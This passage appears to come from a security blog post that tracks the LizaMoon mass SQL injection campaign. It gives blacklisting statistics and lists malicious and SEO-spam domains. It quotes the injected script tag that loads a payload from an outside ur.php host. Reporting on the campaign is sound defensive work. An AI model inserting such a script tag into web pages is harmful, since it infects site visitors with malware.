LizaMoon SQL injections (ur.php) – Now vcvsta.com, asweds.com, etc.

A couple of months ago the Lizamoon malware / Mass SQL injection was getting a lot of news coverage that it could be affecting hundreds of thousands of sites.
The media mostly forgot about it, but we kept tracking those attacks and they are continuing at full force, but using different domain names.
For example, the domain http://vcvsta.com/ur.php caused 1.5k sites to get blacklisted by Google:

Yes, this site has hosted malicious software over the past 90 days. It infected 1583 domain(s), including chamc.co.kr/, mugunghwa.or.kr/, humour.com/.

While http://statsl.com/ur.php, caused more than 600 sites to get blacklisted and searching on Google for http://asweds.com/ur.php on ASP sites returns more than 2k pages.

Yes, this site has hosted malicious software over the past 90 days. It infected 622 domain(s), including rozanaspokesman.com/, 89fm.com.br/, phhc.co.kr/.

So what is going on? The attacks are still at full force, but using different domains names to distribute the malware (always registered by jamesnorthone@hotmailbox.com). A hacked site will have the following code added to their pages (or very similar):

<script src=http://asweds.com/ur.php>..

These are some of the new domains used in this attack:

http://vcvsta.com/ur.php
http://asweds.com/ur.php
http://statsl.com/ur.php
http://general-st.info/ur.php
http://online-guest.info/ur.php
http://google-stats44.info/ur.php
http://booksolo.com (showing up on hacked sites – seo spam)
http://bookvila.com (showing up on hacked sites – seo spam)
http://booktuba.com (showing up on hacked sites – seo spam)
http://bookavio.com (showing up on these hacked sites – seo spam)
http://booknunu.com (same as above)

And some of the old domains being used on for these mass SQL injections:
